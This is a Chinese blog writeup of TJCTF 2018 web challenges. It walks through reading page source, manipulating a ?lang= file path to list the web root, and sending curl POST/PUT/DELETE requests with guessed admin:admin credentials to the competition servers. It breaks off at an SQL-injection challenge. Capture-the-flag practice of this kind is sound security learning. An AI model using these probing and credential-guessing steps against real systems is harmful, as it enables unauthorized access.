<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="ctf," />





  <link rel="alternate" href="/atom.xml" title="jianghuxia's blog" type="application/atom+xml" />






<meta name="description" content="tjctf2018这场比赛挺不错的，很多新颖的题目，题目难度分层的很好，有难有易，下面是这次的writeup.">
<meta name="keywords" content="ctf">
<meta property="og:type" content="article">
<meta property="og:title" content="TJCTF2018_wrtieup">
<meta property="og:url" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/index.html">
<meta property="og:site_name" content="jianghuxia&#39;s blog">
<meta property="og:description" content="tjctf2018这场比赛挺不错的，很多新颖的题目，题目难度分层的很好，有难有易，下面是这次的writeup.">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_1.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_2.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_3.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_4.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_5.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_6.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_7.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_7_1.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_8.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_9.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_10.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_11.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_12.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_13.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_14.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_15.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_16.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_17.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_18.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_18_1.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_19.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_20.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_21.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_22.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_23.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_24.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_25.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_26.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_27.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_28.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_29.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_30.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_31.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_32.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_33.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_34.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_35.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_36.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_37.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_38.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_38_1.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_39.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_40.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_41.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_42.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_43.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_44.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_45.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_46.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_47.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_48.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_49.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_50.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_51.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_52.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_53.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_54.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_55.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_56.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_57.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_58.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_59.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_60.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_61.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_62.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_63.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_64.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534247353801.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436664656.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534407649282.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436687879.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534407683684.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436650329.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436636049.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436619713.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534407714132.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534414794935.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534414344260.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534414385815.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534407751950.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436729219.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436744256.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436757826.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436766535.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436823741.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436838238.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436855531.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436866369.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534407799296.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534417710884.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534407860905.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534418834784.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534418809740.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534419241715.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534420390839.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534407904951.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436887289.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534422298815.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534424302081.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534424553036.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534424769441.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534425618558.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534426177122.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534426710640.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534427041573.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534426960366.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534427078162.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534427503363.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534427886300.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534428164269.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534428438853.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534433941576.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534434040565.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534434128974.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534434883208.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534435182671.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534435760034.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534247371572.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534246708218.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534436916430.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534247383062.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534247407499.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534248009144.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534248225030.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534248361641.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534248728162.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534247454700.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534255658541.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534255714001.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534253039430.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534256442662.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534257098761.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534256830926.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534262213540.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534260174264.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534262789278.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534264233100.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534263359852.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534263835448.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534263724975.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534263982433.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534264078584.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534264536784.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534265080004.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534265279305.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534265181438.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534346794270.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534347300988.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534347432362.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534348615891.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534355168624.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534353106260.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534353131189.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534356504336.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534400079069.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534400328991.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534401201039.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534401772040.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534402938340.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534405699551.png">
<meta property="og:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/1534405633567.png">
<meta property="og:updated_time" content="2018-10-23T10:13:48.368Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="TJCTF2018_wrtieup">
<meta name="twitter:description" content="tjctf2018这场比赛挺不错的，很多新颖的题目，题目难度分层的很好，有难有易，下面是这次的writeup.">
<meta name="twitter:image" content="https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://jianghuxia.github.io/2018/08/13/tjctf2018/"/>





  <title>TJCTF2018_wrtieup | jianghuxia's blog</title>
  








  
  <script type="text/javascript" color="0,0,255" opacity='0.5' zIndex="-1" count="10"  src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
  
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">jianghuxia's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Everyday very nice!</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://jianghuxia.github.io/2018/08/13/tjctf2018/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jianghuxia">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/person_image.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="jianghuxia's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">TJCTF2018_wrtieup</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-13T21:54:27+08:00">
                2018-08-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>tjctf2018这场比赛挺不错的，很多新颖的题目，题目难度分层的很好，有难有易，下面是这次的writeup.</p>
<a id="more"></a> 
<h4 id="Web"><a href="#Web" class="headerlink" title="Web:"></a>Web:</h4><h5 id="Web-Bank"><a href="#Web-Bank" class="headerlink" title="Web_Bank"></a>Web_Bank</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_1.png" alt="img"></p>
<p>打开页面，查看源代码</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_2.png" alt="img"></p>
<h5 id="Web-Cookie-Monster"><a href="#Web-Cookie-Monster" class="headerlink" title="Web_Cookie Monster"></a>Web_Cookie Monster</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_3.png" alt="img"></p>
<p>打开页面，查看源代码，有个<code>/legs</code>，打开</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_4.png" alt="img"></p>
<p>继续右键查看源代码</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_5.png" alt="img"></p>
<h5 id="Web-Central-Savings-Account"><a href="#Web-Central-Savings-Account" class="headerlink" title="Web_Central Savings Account"></a>Web_Central Savings Account</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_6.png" alt="img"></p>
<p>打开网页，查看源代码。</p>
<p>接着打开<code>/static/main.js</code>，拉到底部，md5解码得到答案</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_7.png" alt="img"></p>
<h5 id="Web-Programmable-Hyperlinked-Pasta"><a href="#Web-Programmable-Hyperlinked-Pasta" class="headerlink" title="Web_Programmable Hyperlinked Pasta"></a>Web_Programmable Hyperlinked Pasta</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_7_1.png" alt="1534229658992"></p>
<p>打开网页</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_8.png" alt="img"></p>
<p>查看源代码，发现提示</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_9.png" alt="img"></p>
<p>然而并没啥卵用。。。</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_10.png" alt="img"></p>
<p>去看看下面那个链接</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_11.png" alt="img"></p>
<p>接着尝试改下get的url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://programmable_hyperlinked_pasta.tjctf.org/?lang=en.php</span><br><span class="line">https://programmable_hyperlinked_pasta.tjctf.org/?lang=ch.php</span><br></pre></td></tr></table></figure>
<p>都是空白页面</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_12.png" alt="img"></p>
<p>那就随便尝试，试试该路径，一波操作后，得到很多**消息。。。</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_13.png" alt="img"></p>
<p>查看下源代码</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_14.png" alt="img"></p>
<p>去网站根目录瞧瞧，嘿嘿</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_15.png" alt="img"></p>
<p>当然。。。。。这样也是可以的</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_16.png" alt="img"></p>
<h5 id="Web-Request-Me"><a href="#Web-Request-Me" class="headerlink" title="Web_Request Me"></a>Web_Request Me</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_17.png" alt="img"></p>
<p>打开网页</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_18.png" alt="img"></p>
<p>查看源代码</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_18_1.png" alt="img"></p>
<p>点点看咯，毕竟也没别的东西</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_19.png" alt="img"></p>
<p>随后你打开后，就会发现你做此题所需要了解的http请求方式+curl请求方式知识的链接：</p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS</a></p>
<p>其实就是下面这张图里面的内容：</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_20.png" alt="img"></p>
<p>这里有个http请求方式相关链接：</p>
<p><a href="https://www.cnblogs.com/testcoffee/p/6295970.html" target="_blank" rel="noopener">https://www.cnblogs.com/testcoffee/p/6295970.html</a></p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_21.png" alt="img"></p>
<p>了解了这些，我们用curl试水下</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_22.png" alt="img"></p>
<p>题目url的请求方式都试了一遍，可以看到，POST和DELETE需要凭证</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_23.png" alt="img"></p>
<p>PUT显示了个更奇怪的东西</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_24.png" alt="img"></p>
<p>em~</p>
<p>凭证是什么鬼。。。后面继续试水，这里巨坑</p>
<p>原来所谓的凭证需要经过自己手工fuzz，一波踩坑，请求的data为：<code>username=admin\&amp;password=admin</code></p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_25.png" alt="img"></p>
<p>可以看到PUT有以下结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X PUT &quot;https://request_me.tjctf.org/&quot; --data username=admin\&amp;password=admin</span><br><span class="line">I stole your credentials!</span><br></pre></td></tr></table></figure>
<p>好的，告诉我们得到了凭证，那试试DELECT吧（这里试过get、post，但是没用）</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_26.png" alt="img"></p>
<p>最后谷歌一番，尝试</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_27.png" alt="img"></p>
<p>得到flag</p>
<p>这里还有个坑点：请求方式需要按照以下命令依次输入执行，并且DELETE这条命令需要输入两遍才能得到flag（尝试无数遍的操作）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST &quot;https://request_me.tjctf.org/&quot; --data username=admin\&amp;password=admin</span><br><span class="line">$ curl -X PUT &quot;https://request_me.tjctf.org/&quot; --data username=admin\&amp;password=admin</span><br><span class="line">$ curl -X DELETE &quot;https://request_me.tjctf.org/&quot; --data username=admin\&amp;password=admin -u admin:admin</span><br></pre></td></tr></table></figure>
<h5 id="Web-Moar-Horses"><a href="#Web-Moar-Horses" class="headerlink" title="Web_Moar Horses"></a>Web_Moar Horses</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_28.png" alt="img"></p>
<p>打开网页，看到这个，跟原来那题很想。。。打开开发者工具，会发现随着网页往下托，控制台会出现许多网页</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_29.png" alt="img"></p>
<p>咯，就是这样，往下滑不见底的那种</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_30.png" alt="img"></p>
<p>查看其中任意一个html的源码</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_31.png" alt="img"></p>
<p>猜测应该是大量html中含有一个带有flag的html文件。。。那怎么办呢。总不能一直拉着鼠标往下拖吧。。。。百度，谷歌了下，其实。。。控制台写个命令就行</p>
<p><code>window.setInterval(function(){window.scrollByLines(10000)},1)</code></p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_32.png" alt="img"></p>
<p>然后跑啊跑。。。。。。。1500多条才跑出来。。。</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_33.png" alt="img"></p>
<p>后面用ubuntu自带的火狐，跑了100多条请求就跑出来。。晕死。。这是为啥？</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_34.png" alt="img"></p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_35.png" alt="img"></p>
<h5 id="Web-Ess-Kyoo-Ell"><a href="#Web-Ess-Kyoo-Ell" class="headerlink" title="Web_Ess Kyoo Ell"></a>Web_Ess Kyoo Ell</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_36.png" alt="img"></p>
<p>打开网页</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_37.png" alt="img"></p>
<p>随意测试,用bp拦截下</p>
